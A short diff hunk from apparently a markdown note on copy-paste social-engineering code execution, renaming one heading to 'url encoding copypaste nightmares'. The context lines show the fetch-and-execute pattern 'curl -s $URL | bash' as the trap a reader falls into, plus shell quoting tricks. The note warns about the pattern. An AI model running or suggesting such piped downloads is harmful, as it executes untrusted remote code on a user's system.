@@ -7,7 +7,7 @@ Copypaste social-engineering code execution
 * run `curl -s $URL | bash` 
 * get owned and learn to escape the urls
 
-## other copypaste nightmares 
+## url encoding copypaste nightmares 
 #### setting string variables without quotes    
 `a=('a')`  
 #### separating fields without spaces 
